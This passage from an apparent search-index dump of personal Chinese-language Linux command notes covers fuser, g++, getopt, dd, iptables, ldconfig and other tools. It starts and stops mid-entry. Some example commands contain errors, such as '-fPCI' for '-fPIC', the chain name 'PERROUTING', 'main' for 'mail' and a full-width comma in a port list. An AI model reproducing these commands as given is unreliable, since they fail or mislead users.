-a：显示所有命令行中指定的文件，默认情况下被访问的文件才会被显示。 -c：和-m一样，用于POSIX兼容。 -k：杀掉访问文件的进程。如果没有指定-signal就会发送SIGKILL信号。 -i：杀掉进程之前询问用户，如果没有-k这个选项会被忽略。 -l：列出所有已知的信号名称。 -m：name 指定一个挂载文件系统上的文件或者被挂载的块设备（名称name）。这样所有访问这个文件或者文件系统的进程都会被列出来。如果指定的是一个目录会自动转换成\"name/\",并使用所有挂载在那个目录下面的文件系统。 -n：space 指定一个不同的命名空间(space).这里支持不同的空间文件(文件名，此处默认)、tcp(本地tcp端口)、udp(本地udp端口)。对于端口， 可以指定端口号或者名称，如果不会引起歧义那么可以使用简单表示的形式，例如：name/space (即形如:80/tcp之类的表示)。 -s：静默模式，这时候-u,-v会被忽略。-a不能和-s一起使用。 -<signal>：使用指定的信号，而不是用SIGKILL来杀掉进程。可以通过名称或者号码来表示信号(例如-HUP,-1),这个选项要和-k一起使用，否则会被忽略。 -u：在每个PID后面添加进程拥有者的用户名称。 -v：详细模式。输出似ps命令的输出，包含PID,USER,COMMAND等许多域,如果是内核访问的那么PID为kernel. -V 输出版本号。 -4：使用IPV4套接字,不能和-6一起应用，只在-n的tcp和udp的命名存在时不被忽略。 -6：使用IPV6套接字,不能和-4一起应用，只在-n的tcp和udp的命名存在时不被忽略。 - 重置所有的选项，把信号设置为SIGKILL. 参数: 文件：可以是文件名或者TCP、UDP端口号 fuser可以发送它已知的信号给访问的指定文件进程而代替-k参数默认发送的SIGKILL: [root@_mongodb_117 ~]# fuser -v /root/install.log 用户 进程号 权限 命令 /root/install.log: root 3347 f.... tail [root@_mongodb_117 ~]# fuser -k -SIGHUP /root/install.log /root/install.log: 3347 [root@_mongodb_117 ~]# fuser -v /root/install.log 杀掉打开readme文件的程序, 这里，会在kill之前询问是否确定。最好加上-v以便知道将要杀那个进程: $fuser -m -k -i readme","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-fuseer.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-fuseer.html"},{"title":"g++","text":"一般用于编译C++ 选项: -I <dir> 指定头文件所在目录, 会优先找此处指定的目录 -l <dir> 指定需要链接的库名，用于告诉链接器需要链接哪些库文件 即指定动态库的名称(去掉lib前缀和.so后缀) -L <dir> 指定动态库搜索路径 -f no-lto 禁用链接时优化（LTO） 当使用该选项编译源代码时，编译器将不会进行链接时优化， 这可能会导致一些性能上的损失，但也可以避免某些链接错误。 -s hared 生成动态库(.so文件),而不是静态库(.a文件) -f PIC 生成位置无关代码(position-independent code), 使得代码可以在不同的内存地址执行,这对于动态库是必需的 -g 在编译过程中生成调试信息(debugging information), 并将其嵌入到最终的可执行文件或目标文件中。 带有调试信息的可执行文件可以用调试器(debugger)来调试和跟踪代码 -c 仅编译,不链接。只生成目标文件(.o文件),不生成可执行文件。 对于 -c 选项的说明 通常g++的使用流程是: 编译源文件(.c或.cpp)生成目标文件(.o文件),使用-c选项 链接多个目标文件和库文件,生成可执行文件,使用-o选项指定输出文件 所以-c选项使得编译和链接成两个步骤进行。比如: g++ -c hello.c # 仅编译,生成hello.o g++ -c main.c # 仅编译,生成main.o g++ hello.o main.o -o hello # 链接目标文件生成可执行文件 如果不使用-c选项,g++会自动执行编译和链接两个步骤,例如: g++ hello.c main.c -o hello # 会编译hello.c和main.c,然后链接生成可执行文件hello 例-生成静态库文件和共享库文件 编译myfile.cpp: g++ -c myfile.cpp 注解 静态库文件和共享库文件都是由.o目标文件生成 生成共享库文件libmy.so: g++ -shared -fPCI -o libmy.so myfile.o 打包成静态库文件libmy.a: ar -r libmy.a myfile.o # ar: creating libmy.a","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-g-++.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-g-++.html"},{"title":"getfattr","text":"get extended attributes of filesystem objects 获取文件系统扩展属性信息(用 /docs/操作系统/linux/linux指令/setfattr 命令设置的属性) 语法格式: getfattr [参数] 文件名 常用参数： -d 显示所有扩展属性值 -e 设置编码值类型 -h 不引用符号链接 -m 包括名称匹配正则表达式模式的属性 -n 显示已命名的扩展属性值 -P 跳过所有符号链接 -R 递归处理所有子文件 --help 显示帮助信息 --version 显示版本信息","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-getfattr.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-getfattr.html"},{"title":"getopt","text":"getopt选项字符串: \"a:b:cd::e\"，这就是一个选项字符串。对应到命令行就是-a ,-b ,-c ,-d, -e 。 冒号又是什么呢？ 冒号表示参数， 一个冒号就表示这个选项后面必须带有参数（没有带参数会报错哦）， 但是这个参数可以和选项连在一起写，也可以用空格隔开，比如-a123 和-a 123（中间有空格） 都表示123是-a的参数； 两个冒号的就表示这个选项的参数是可选的，即可以有参数，也可以没有参数， 但要注意有参数时，参数与选项之间不能有空格（有空格会报错），这一点和一个冒号时是有区别的。 -o或--options选项后面是可接受的短选项，如ab:c::，表示可接受的短选项为-a -b -c，其中-a选项不接参数，-b选项后必须接参数，-c选项的参数为可选的 -l或--long选项后面是可接受的长选项，用逗号分开，冒号的意义同短选项。 -n选项后接选项解析错误时提示的脚本名字 常用参数 -a 允许长选项以单个字符\"-\"开始 -n 指定一个程序，供getopt(3)函数输出错误信息时使用 -o 识别单字符的短选项 -q 禁止输出错误信息 -l 识别多字符的长选项 自己写过的一个例子, 至少需要一个短选项 : #sh ./test.sh -l --warn ww --error ee --info ii --fatal ff # ARGS=\"getopt -o h -l warn:,error:,info:,fatal: -- $@\" # eval set -- \"${ARGS}\" getopt -o h -l warn:,error:,info:,fatal: -- $@ while true do case \"$1\" in --warn) echo \"warn: i am $2\" shift 2 ;; --error) echo \"error: i am $2\" shift 2 ;; --info) echo \"info: i am $2\" shift 2 ;; --fatal) echo \"fatal: i am $2\" shift 2 ;; --) shift break ;; *) echo \"error---$1 $2\" break ;; esac done getopt的区别与分类 上述例子有问题, 此处再重新介绍一下. getopt有三种 getopt标准版: 只能识别短选项; getopt增强版: 短选项长选项皆可; getopts: 只能识别短选项(严格来说可能也不能放在这) 其中, 识别getopt是标准版还是增强版可使用-T: getopt -T 标准版输出如下: $ getopt -T -- $ echo $? 0 增强版输出如下: root@67a43e314058:~# getopt -T root@67a43e314058:~# echo $? 4 下面代码基于增强版编写, 注意对选项参数的定义: ARGS=$(getopt -o hu: -l help,user:,age:,name:: -- \"$@\") 长选项使用 --long 或 -l 皆可, 测试: root@67a43e314058:~# sh t_getopt.sh -u yq --name=11 --age 10 ARGS::: -u 'yq' --name '11' --age '10' -- user:yq age:10 name:11 root@67a43e314058:~# sh t_getopt.sh -u yq --name 11 --age 10 ARGS::: -u 'yq' --name '' --age '10' -- '11' user:yq age:10 name: 可以看出 --name=11 与 --name 11 的结果是不一样的, 后者没有成功赋值到name, 这是因为getopt解析时限定为 name:: (双冒号). 两个冒号表示参数可选, 在debian11上默认空格选择的是非选项参数(不知其他系统是不是亦是). 如果要规避可以使用一个冒号表示参数必选. 注解 无冒号表示选项不带参数; 一个冒号表示选项必须指定参数; 两个冒号表示选项参数可选. getopt作用说明 从上一节 getopt的区别与分类 的例子中可以看出, 其作用只是对命令行输入的参数做了一个校验与规范化, 实际 eval set -- \"${ARGS}\" 前后的 ARGS 都是一致的, 那么这句eval 是不是必须的呢? 是. eval set -- \"${ARGS}\" 的作用是将 ${ARGS} 中的字符串解析为命令行参数，并赋值给脚本中的位置参数。 \"${ARGS}\" 使用双引号将整个字符串括起来，这样可以确保参数中存在的空格不会被解释为分隔符。 set -- \"${ARGS}\" 将 ${ARGS} 中的字符串按照空格进行拆分，并将拆分后的结果设置为脚本的位置参数。 位置参数是脚本中可用于访问传递到脚本的参数的特殊变量，它们被存储在 $1、$2、$3 等变量中。 注意: 此时的结果是一个整体字符串, 还需要使用eval才能将其拆分为正常的多个参数字符串 eval 命令用于执行由 set -- \"${ARGS}\" 生成的命令，将其作为有效的Shell命令执行。 通过使用 eval 命令，我们可以将 ${ARGS} 中的字符串解析为实际的命令行参数，以便在脚本中使用这些参数进行进一步的处理或操作。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-getopt.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-getopt.html"},{"title":"gnome-terminal","text":"主要适用于gnome的图形化桌面系统, 用于打开一个新的终端 打开一个终端并执行ls: gnome-terminal -- ls 打开一个终端并执行ls, 执行后不退出: gnome-terminal -- bash -c 'ls ; bash'","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-gnome-Terminal.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-gnome-Terminal.html"},{"title":"gzip","text":"压缩/解压文件, 压缩包后缀名一般为.gz 语法: gzip [选项] 被压缩文件 常用选项： -d 解压 -r 压缩所有子目录 注解 tar的 -z选项就是调用的gzip压缩","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-gzip.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-gzip.html"},{"title":"halt","text":"halt 命令通知硬件来停止所有的 CPU 功能，但是仍然保持通电。 你可以用它使系统处于低层维护状态。注意在有些情况会它会完全关闭系统。 停止机器: halt 关闭机器、关闭电源: halt -p 重启机器: halt --reboot","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-halt.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-halt.html"},{"title":"hash","text":"每个SHELL都有一个独立的hash表, 初始时候为空, 可直接hash查看当前SHELL的hash表: hash 每当你执行过一条命令时，hash表会记录下这条命令的路径，就相当于缓存一样。 第一次执行命令shell解释器默认的会从PATH路径下寻找该命令的路径， 当你第二次使用该命令时，shell解释器首先会查看hash表，没有该命令才会去PATH路径下寻找 hash表的作用：大大提高命令的调用速率 不带参数, 查看当前已有的表, hash表会记录下执行命令的次数，以及该命令的绝对路径 选项: -l 既可以看到hash表命令的路径，也可以看到它的名字及别名 -p <cmd new_name> 给已有的指令 cmd 重命名为 new_name (起别名), 如: hash -p /bin/ls bb 之后直接 bb 调用的就是ls了 -t <cmd> 查看 cmd 在hash表中存储的路径, 没有就直接报错没找到 -r 清空hash表 -d <cmd> 仅清除某一个hash记录","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-have.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-have.html"},{"title":"iconv","text":"iconv 转换指定文件的编码，默认输出到标准输出设备，亦可指定输出文件 使用: iconv [options] [file] 选项参数 -f , --from-code= encode-name 原始文本编码 -t , --to-code= encode-name 输出编码 -l , --list 列举所有已知的字符集 -c 从输出中忽略无效的字符 -o , --output= FILE 输出文件 -s , --silent 关闭警告 --verbose 打印进度信息 用例 将文件以 gbk 编码读出, 并转化为 utf8 编码, 重定向到 b.txt: # 有次mac下载了一本小说, 打开乱码, page的自动识别编码没法用 # 又没有notpad++这种工具, vscode倒是可以切换编码, 但是保存的时候存在问题. # 只好用命令转换了 iconv -f gbk -t utf8 -c mushenji2.txt >b.txt","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iconv-(mac).html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iconv-(mac).html"},{"title":"ifstat","text":"查看实时网速 安装(Debian/Ubuntu): apt install ifstat","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ifStat.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ifStat.html"},{"title":"dd","text":"复制文件并对原文件的内容进行转换和格式化处理: bs=<字节数>：将ibs（输入）与obs（输出）设成指定的字节数； cbs=<字节数>：转换时，每次只转换指定的字节数； conv=<关键字>：指定文件转换的方式； count=<区块数>：仅读取指定的区块数； ibs=<字节数>：每次读取的字节数； obs=<字节数>：每次输出的字节数； if=<文件>；代表输入文件 of=<文件>：输出到文件； seek=<区块数>：一开始输出时，跳过指定的区块数； skip=<区块数>：一开始读取时，跳过指定的区块数； --help：帮助； --version：显示版本信息。 例如生成10g的大文件: dd if=/dev/zero of=test bs=1M count=0 seek=10000 #不占空间 dd if=/dev/zero of=test bs=10G count=1 读取位于地址 0x1000 的 4 字节数据: # /dev/mem 代表物理内存 dd if=/dev/mem bs=4 count=1 skip=$((0x1000)) status=none | od -t x4 -An 拓展-Win下读取指定内存地址数据 使用 WinDbg 调试器 WinDbg 是 Windows 平台上使用的强大调试器工具。 使用 WinDbg，您可以打开一个进程的内存空间并读取指定地址的数据。 示例命令，在 WinDbg 中读取地址 0x1000 的 4 字节数据: > .open <进程名或进程ID> > db 0x1000 L4","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-in-the-end.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-in-the-end.html"},{"title":"iptables","text":"iptables其实不是真正的防火墙，可以理解为一个客户端代理， 用户通过iptables这个代理，将用户的安全设定到对应的安全框架， 而这个安全框架才是真正的防火墙，这个框架是 netfilter netfilter 才是防火墙真正的安全框架，位于内核空间. netfilter 是linux操作系统核心层内部的一个数据包处理模块，具有如下功能： 网络地址转换（network address translate） 数据包内容修改 以及数据包过滤的防火墙功能 netfilter/iptables 组成linux平台下的包过滤防火墙。 免费，可以替代昂贵的商业防火墙解决方案，完成封包过滤、封包重定向、网络地址转换（NAT）等功能。 虽然使用 service iptables restart 来启动服务，更准确的说， iptables并没有一个守护进程，所以并不算是真正意义上的服务，而应该是内核提供的服务。 语法-选项 语法: iptables -t 表名 <-A/I/D/R> 规则链名 [规则号] <-i/o 网卡名> -p 协议名 <-s 源IP/源子网> --sport 源端口 <-d 目标IP/目标子网> --dport 目标端口 -j 动作 #-A 指定链的末尾新增一个指定的规则 #-I 链的指定位置插入一条或多条规则 #-D 指定链的chain中删除一条或者多条规则 #-R num 替换/修改第几条规则 #-P 设置默认规则 选项 -P 设置默认策略:iptables -P INPUT (DROP -F 清空规则链 -L 查看规则链 -A 在规则链的末尾加入新规则 -I num 在规则链的头部加入新规则 -D num 删除某一条规则 -s 匹配来源地址IP/MASK，加叹号\"!\"表示除这个IP外。 -d 匹配目标地址 -i 网卡名称 匹配从这块网卡流入的数据 -o 网卡名称 匹配从这块网卡流出的数据 -p 匹配协议,如tcp,udp,icmp --dport num 匹配目标端口号 --sport num 匹配来源端口号 -n 表示不对 IP 地址进行反查，加上这个参数显示速度将会加快。 -v 表示输出详细信息，包含通过该规则的数据包数量、总字节数以及相应的网络接口。 -m 表示使用模块 参考: https://www.zsythink.net/archives/1199 如: iptables -t nat -A PERROUTING -p tcp -s 10.10.10.10 --sport 67 -d 10.10.10.11 --dport 67 -j ACCEPT # 这里如果是多端口可能会出现不能识别sport的情况 需搭配multiport # multiport多端口，\"，\"表示或，\"：\"表示区间 iptables -t nat -A PERROUTING -p tcp -s 10.10.10.10 -m multiport --sport 67，68 -d 10.10.10.11 --dport 67 -j ACCEPT -j 的几种动作 ACCEPT #接收数据包 DROP #丢弃数据包 REDIRECT #重定向，映射,透明代理 SNAT #源地址转换 DNAT #目标地址转换 MASQUERADE #IP伪装（NAT），用于ADSL LOG #日志记录 iptables默认链 INPUT 处理输入数据包 OUTPUT 处理输出数据包 FORWARD 处理转发数据包 PERROUTING 用于目标地址转换（DNAT） POSTROUTING 用于源地址转换（SNAT） 过滤框架 如果是外部主机发送数据包给防火墙本机，数据将会经过 PREROUTING 链与 INPUT 链； 如果是防火墙本机发送数据包到外部主机，数据将会经过 OUTPUT 链与 POSTROUTING 链； 如果防火墙作为路由负责转发数据，则数据将经过 PREROUTING 链、FORWARD 链以及 POSTROUTING 链。 四种表 filter 过滤功能，只能作用在三个链上面：INPUT,FORWARD,OUTPUT nat 地址转换，只能作用在：PREROUTING,OUTPUT,POSTROUTING(centos 7中还有INPUT) mangle 修改报文原数据，五个链都可以 raw 关闭nat启用的追踪机制，PREROUTING,OUTPUT 换种方式: # 链 表 prerouting raw --> mangle --> nat input mangle --> filter (centos7 has nat, 6 not) forward mangle --> filter output raw --> mangle --> nat --> filter postrouting mangle --> nat 常用的一些命令 常用的一些命令: iptables -F # 清空所有的防火墙规则 iptables -nvL # 查看三个链 iptables -X INPUT # 删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。 # 如果没有指定链名，则会删除该表中所有非内置的链。 iptables -Z INPUT # 把指定链，或者表中的所有链上的所有计数器清零。 iptables -L [-t 表名] [链名] # 列出已设置的规则 -m的一些模块 multiport 多端口匹配 可用于匹配非连续或连续端口；最多指定15个端口； 实例: iptables -A INPUT -p tcp -m multiport --dport 22,80 -j ACCEPT iptables -A OUTPUT -p tcp -m multiport --sport 22,80 -j ACCEPT iprange 匹配指定范围内的地址 匹配一段连续的地址而非整个网络时有用 实例: iptables -A INPUT -p tcp -m iprange --src-range 192.168.118.0-192.168.118.60 --dport 22 -j ACCEPT iptables -A OUTPUT -p tcp -m iprange --dst-range 192.168.118.0-192.168.118.60 --sport 22 -j ACCEPT string 字符串匹配，能够检测报文应用层中的字符串 字符匹配检查高效算法：kmp, bm, 能够屏蔽非法字符 实例: #注意该条规则需要添加到OUTPUT链，当服务端返回数据报文检查到有关键字\"sex\"时，则丢弃该报文，可用于web敏感词过滤 iptables -A OUTPUT -p tcp --dport 80 -m string --algo kmp --string \"sex\" -j DROP connlimit 连接数限制，对每IP所能够发起并发连接数做限制； 默认INPUT 为 DROP. 每个ip对ssh服务的访问最大为3个并发连接，超过则丢弃: iptables -A INPUT -p tcp --dport 22 -m connlimit ! --connlimit-above 3 -j ACCEPT limit 速率限制 limit-burst 设置默认阀值 默认放行10个，当到达limit-burst阀值后，平均6秒放行1个: iptables -A INPUT -p icmp -m limit --limit 10/minute --limit-burst 10 -j ACCEPT state 状态检查 连接追踪中的状态： NEW: 新建立一个会话 ESTABLISHED：已建立的连接 RELATED: 有关联关系的连接 INVALID: 无法识别的连接 放行ssh的首次连接状态: iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j ACCEPT 详细点 INVALID：无效的封包，例如数据破损的封包状态 ESTABLISHED：已经联机成功的联机状态； NEW：想要新建立联机的封包状态； RELATED：这个最常用！表示这个封包是与我们主机发送出去的封包有关， 可能是响应封包或者是联机成功之后的传送封包！这个状态很常被设定，因为设定了他之后，只要未来由本机发送出去的封包，即使我们没有设定封包的 INPUT 规则，该有关的封包还是可以进入我们主机， 可以简化相当多的设定规则。 相关指令 /docs/操作系统/linux/linux指令/iptables-save /docs/操作系统/linux/linux指令/iptables-restore 问题--sport不能识别 --sport一直不能识别，百度也没查到原因 询问才知道。需要配合指定协议与multiport来匹配多端口才可以 端口如果使用 冒号 表示连续端口","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iptables.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iptables.html"},{"title":"iptables-restore","text":"批量导入Linux防火墙规则 例如将/tmp/iptables.txt规则写入iptables: iptables-restore < /tmp/iptables.txt 注解 备份恢复时， /docs/操作系统/linux/linux指令/iptables-save 、 iptables-restore 两个都需要搭配重定向符使用","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iptables-restore.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iptables-restore.html"},{"title":"iptables-save","text":"批量导出Linux防火墙规则， 直接执行：显示当前启用的所有规则，按raw、mangle、nat、filter顺序列出 -c 指定在还原iptables表时候，还原当前的数据包计数器和字节计数器的值； -t 指定表 \"#\"号开头的表示注释； \"*表名\"表示所在的表； \"：链名默认策略\"表示相应的链及默认策略，具体的规则部分省略了命令名\"iptables\"； \"COMMIT\"表示提交前面的规则设置； 注解 备份恢复时， iptables-save、 /docs/操作系统/linux/linux指令/iptables 两个都需要搭配重定向符使用 以前记的, 现在不记得啥意思: # 这是注释 *nat # 这表示下面这些是nat表中的配置 :PREROUTING ACCEPT [5129516:445315174] # :PREROUTING ACCEPT，表示nat表中的PREROUTING 链默认报文策略是接受（匹配不到规则继续） ， # [5129516:445315174] 即[packet, bytes]，表示当前有5129516个包(445315174字节)经过nat表的PREROUTING 链 :INPUT ACCEPT [942957:151143842] :OUTPUT ACCEPT [23898:3536261] :POSTROUTING ACCEPT [23898:3536261] -- 解释同上 :DOCKER - [0:0] -- 解释同上（此条是自定义链） ---------- 下面开始按条输出所有规则---------- [4075:366986] -A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER -- [4075:366986]即[packet, bytes]，表示经过此规则的包数，字节数。 后面部分则是用iptables命令配置此规则的命令（详解选项可参考iptables帮助）。 [0:0] -A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER [0:0] -A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE [2:188] -A POSTROUTING -s 192.168.122.0/24 -d 224.0.0.0/24 -j RETURN [0:0] -A POSTROUTING -s 192.168.122.0/24 -d 255.255.255.255/32 -j RETURN [0:0] -A POSTROUTING -s 192.168.122.0/24 ! -d 192.168.122.0/24 -p tcp -j MASQUERADE --to-ports 1024-65535 [0:0] -A POSTROUTING -s 192.168.122.0/24 ! -d 192.168.122.0/24 -p udp -j MASQUERADE --to-ports 1024-65535 [0:0] -A POSTROUTING -s 192.168.122.0/24 ! -d 192.168.122.0/24 -j MASQUERADE [0:0] -A DOCKER -i docker0 -j RETURN --以上规则同第一条规则的解释 COMMIT -- 应用上述配置 # Completed on Tue Jan 15 15:42:32 2019","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iptables-save.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-iptables-save.html"},{"title":"join","text":"处理两个文件之间的数据 -t join默认以空格符分隔数据，并且比对第一个字段的数据 如果忽略两个文件相同，则将两笔数据联成一行，且第一个字段放在第一个 -i 忽略大小写 -1 数字的1，表示第一个文件要用哪个字段来分析 -2 数字的2，表示第二个文件要用哪个字段分析","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-join.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-join.html"},{"title":"ldconfig","text":"动态链接库管理命令，其目的为了让动态链接库为系统所共享 ldconfig的主要用途 搜索出可共享的动态链接库，库文件的格式为：lib***.so.**，进而创建出动态装入程序(ld.so)所需的链接和缓存文件. 缓存文件默认为/etc/ld.so.cache，该文件保存已排好序的动态链接库名字列表. 搜索范围: 默认搜寻/lilb和/usr/lib 搜索配置文件/etc/ld.so.conf内所列的目录下的库文件 注解 ldconfig通常在系统启动时运行，而当用户安装了一个新的动态链接库时，就需要手工运行这个命令。 往/lib和/usr/lib里面加东西，是不用修改/etc/ld.so.conf文件的， 但是添加完后需要调用下ldconfig，不然添加的library会找不到。 如果添加的library不在/lib和/usr/lib里面的话，就一定要修改/etc/ld.so.conf文件，往该文件追加library所在的路径， 然后也需要重新调用下ldconfig命令。 比如在安装MySQL的时候，其库文件/usr/local/mysql/lib，就需要追加到/etc/ld.so.conf文件中。 命令如下: # echo \"/usr/local/mysql/lib\" >> /etc/ld.so.conf # ldconfig -v | grep mysql 如果添加的library不在/lib或/usr/lib下，但是却没有权限操作写/etc/ld.so.conf文件的话， 这时就需要往export里写一个全局变量LD_LIBRARY_PATH，就可以了 参数说明 -v , --verbose 显示正在扫描的目录及搜索到的动态链接库,还有它所创建的链接的名字 -n <dir> 仅扫描命令行指定的目录,不扫描默认目录(/lib,/usr/lib),也不扫描配置文件/etc/ld.so.conf所列的目录. -N 不重建缓存文件(/etc/ld.so.cache).若未用-X选项,ldconfig照常更新文件的链接. -X 不更新文件的链接.若未用-N选项,则缓存文件正常更新. -f <CONF> 指定动态链接库的配置文件为CONF,系统默认为/etc/ld.so.conf. -C <CACHE> 指定生成的缓存文件为CACHE,系统默认的是/etc/ld.so.cache,此文件存放已排好序的可共享的动态链接库的列表. -r <ROOT> 改变应用程序的根目录为ROOT(是调用chroot函数实现的). 选择此项时,系统默认的配置文件/etc/ld.so.conf,实际对应的为ROOT/etc/ld.so.conf. 如用-r/usr/zzz时,打开配置文件/etc/ld.so.conf时,实际打开的是/usr/zzz/etc/ld.so.conf文件. 用此选项,可以大大增加动态链接库管理的灵活性. -l 通常情况下,ldconfig搜索动态链接库时将自动建立动态链接库的链接. 选择此项时,将进入专家模式,需要手工设置链接.一般用户不用此项. -p , --print-cache 指示ldconfig打印出当前缓存文件所保存的所有共享库的名字. -c <FORMAT> , --format= <FORMAT> 指定缓存文件所使用的格式,共有三种:ld(老格式),new(新格式)和compat(兼容格式,此为默认格式). -V 打印出ldconfig的版本信息,而后退出. --help , --usage 或者直接横杠 - , 让ldconfig打印出其帮助信息,而后退出.","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ldconfig.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ldconfig.html"},{"title":"lsblk","text":"列出所有储存装置 -d 仅列出磁盘本身，不列出分区数据 -f 同时列出磁盘内的文件系统名称 -i 使用ASCII的线段输出，不适用复杂编码 -m 同时输出该装置在 /dev 下的权限信息 -p 列出该装置的完整文件名，而不是仅列出最后的名字 -t 列出该磁盘装置的详细数据，包括磁盘队列机制、预读写的数据量大小等","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-lsblk.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-lsblk.html"},{"title":"lszrz","text":"安装: apt install lrzsz 这是一个工具包, 包含 sz, rz指令, 可用于xshell这种ssh工具时, 发送/上传本地文件. sz: 下载终端文件到本地 rz: 在终端下载本地文件 用法: sz [文件名, 支持多个] # 直接出发文件选择框自己选择文件 rz 注解 在公司内网机的MobaXterm上调用失败, 不知是版本问题还是啥","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-lszrz.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-lszrz.html"},{"title":"mail","text":"发送信息 语法: main -s '$标题' $username@$host < $file","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mAIL.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mAIL.html"},{"title":"mkdir","text":"创建文件夹 -p 如果没有则创建（多级目录的情况） 如果有 不作操作不报错 -v 创建时输出","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mkdir.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-mkdir.html"},{"title":"more","text":"根据窗口大小，一页一页的显示文件内容 more执行后的操作键: 空格: 显示下一屏 enter: 一次滚动一行 b: 回滚一屏 f: 前滚一屏 q: 退出 /word: 搜索word","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-more.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-more.html"},{"title":"nmcli","text":"配置网络管理器 如, 要将名为 eth0 的有线网络接口配置为自动连接: sudo nmcli connection modify eth0 connection.autoconnect yes","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-nmcli.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-nmcli.html"},{"title":"nohup","text":"不挂断地运行命令。no hangup的缩写，意即\"不挂断\"。 nohup运行命令，忽略所有挂断（SIGHUP）信号； 仅不挂断的运行，注意没有后台运行功能 用nohup运行命令可以使命令永久的执行下去，和用户终端没有关系， 例如我们断开SSH连接都不会影响他的运行 &是指在后台运行，但当用户退出(挂起)的时候，命令自动也跟着退出 那么，可以巧妙的吧他们结合起来用就是 nohup COMMAND & 这样就能使命令永久的在后台执行","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-noHup.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-noHup.html"},{"title":"nslookup","text":"使用系统配置进行域名解析 用法: nslookup [-query=[type]] [hostname|ip] 参数 -query=type 查询的类型，除了传统的IP与主机名对应外，DNS还有很多信息","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-nslookup.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-nslookup.html"},{"title":"ntpdate","text":"检索ip是否可以作为ntp对时服务器: ntpdate -d ip -a Keyid 使用 Keyid 来认证全部数据包。 -b 通过调用 settimeofday 子例程来增加时钟的时间。 -d 指定调试方式。判断 ntpdate 命令会产生什么结果（不产生实际的结果）。 结果再现在屏幕上。这个标志使用无特权的端口。 -e AuthenticationDelay 指定延迟认证处理的时间秒数。 -k KeyFile 当不使用缺省值 /etc/ntp.keys 文件时，为包含密钥的文件指定一个不同的名称。 -o Version 当轮询它的发出数据包时，指定使用的 NTP 版本实现。 Version 的值可以是 1，2，3。缺省值是 3。 -p Samples 指定从每个服务器获取的样本的数目。 Samples 的值在 1 和 8 之间，并包括 1 和 8。它的缺省值是 4。 -s 指定日志操作 syslog 设施的使用，而不是使用标准输出。 当运行 ntpdate 命令和 cron命令时，它是很有用的。 -t TimeOut 指定等待响应的时间。给定 TimeOut 的值四舍五入为 0.2 秒的倍数。缺省值是 1 秒。 -u 指定使用无特权的端口发送数据包。 当在一个对特权端口的输入流量进行阻拦的防火墙后是很有益的， 并希望在防火墙之外和主机同步。 防火墙是一个系统或者计算机，它控制从外网对专用网的访问。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ntpdate.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-ntpdate.html"},{"title":"objdump","text":"参考: https://zhuanlan.zhihu.com/p/115834125 https://blog.csdn.net/wwchao2012/article/details/79980514 显示二进制文件信息 用来显示一个或者多个目标文件的信息, 可以是静态库归档文件. 语法: objdump [选项] objfile... 选项: --archive-headers , -a 显示档案库的成员信息,类似 ls -l 将 lib*.a 